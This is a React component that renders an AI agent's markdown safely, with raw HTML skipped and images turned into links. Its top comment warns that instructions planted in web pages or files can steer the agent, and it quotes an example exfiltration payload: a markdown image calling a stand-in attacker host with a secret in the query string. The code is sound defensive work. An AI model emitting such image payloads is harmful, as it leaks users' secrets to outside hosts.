import { Box } from '@mui/material'
import ReactMarkdown, { type Components } from 'react-markdown'
import { MONO } from '../theme'

// Agent text can carry instructions planted in web pages or files, so it is rendered with no raw
// HTML and no remote images: an image like ![](https://attacker/?q=<secret>) would send data away
// the moment it rendered. Links open in a new tab without access to this page.
const components: Components = {
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  ),
  img: ({ src, alt }) => (
    <a href={typeof src === 'string' ? src : undefined} target="_blank" rel="noopener noreferrer">
      [image: {alt || 'no description'}]
    </a>
  ),
}

export function Markdown({ text }: { text: string }) {
  return (
    <Box
      sx={{
        overflowWrap: 'anywhere',
        '& > :first-of-type': { mt: 0 },
        '& > :last-child': { mb: 0 },
        '& p, & ul, & ol, & pre': { my: 1 },
        '& ul, & ol': { pl: 2.5 },
        '& a': { color: 'primary.main' },
        '& code': { fontFamily: MONO, fontSize: 13, px: 0.5, borderRadius: '4px', bgcolor: 'var(--raised)' },
        '& pre': { p: 1.5, borderRadius: '8px', bgcolor: 'background.default', border: 1, borderColor: 'divider', overflowX: 'auto' },
        '& pre code': { p: 0, bgcolor: 'transparent' },
      }}
    >
      <ReactMarkdown skipHtml components={components}>
        {text}
      </ReactMarkdown>
    </Box>
  )
}
